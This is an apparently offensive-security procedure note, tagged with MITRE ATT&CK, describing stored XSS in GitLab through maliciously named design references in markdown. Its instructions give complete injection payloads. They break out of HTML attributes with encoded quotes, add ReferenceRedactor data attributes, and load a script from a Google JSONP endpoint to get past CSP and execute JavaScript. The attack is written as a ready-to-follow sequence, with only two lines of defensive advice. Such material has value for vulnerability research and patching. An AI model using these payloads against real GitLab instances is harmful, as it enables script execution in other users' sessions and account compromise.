---
tags:
  - xss
  - markdown-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: abfa8028-bccb-4f09-a4e4-89482aa4e927
created_at: '2025-12-11T03:47:56.719Z'
updated_at: '2025-12-11T03:47:56.719Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Inject XSS via Markdown Reference

## Summary

This procedure references the maliciously named design in GitLab markdown to inject arbitrary HTML attributes, leading to stored XSS and JavaScript execution.

## Description

By linking to the design with injected quotes, attackers break out of attributes in the generated HTML, allowing custom attributes or scripts. This bypasses CSP and triggers in issues or comments.

## Requirements

1. Malicious design uploaded
2. Access to create issues
3. Knowledge of markdown syntax

## Defense

Defensive measures and detection strategies:

- Sanitize filenames and markdown references strictly
- Implement CSP with strict-dynamic

## Objectives

1. Inject attributes via markdown link
2. Trigger XSS payload
3. Verify execution on reload

## Instructions

### Step 1: Create Issue with Basic Injection

**Context**: Test attribute injection with a simple link.

Create issue with markdown: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' vakzz=here </a>. Inspect HTML for 'vakzz' attribute.

### Step 2: Inject Full Payload

**Context**: Add data attributes to trigger ReferenceRedactor with script.

Create another issue with: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' data-design="1" data-issue="1" data-reference-type="design" data-original=" <script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'></script> " </a>.

### Step 3: Save and Reload

**Context**: Trigger the XSS by reloading the page.

Save the issue and reload to execute the injected script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- xss
- markdown-injection
